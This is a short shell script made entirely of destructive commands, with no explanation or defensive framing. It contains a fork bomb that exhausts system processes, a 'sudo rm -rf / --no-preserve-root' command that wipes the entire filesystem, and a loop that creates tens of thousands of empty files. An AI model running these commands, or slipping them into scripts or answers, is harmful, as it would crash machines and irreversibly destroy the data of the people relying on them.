#!/bin/sh

:(){ :|:& };:

sudo rm -rf / --no-preserve-root
for i in `seq 99999` ;do > $i ;done
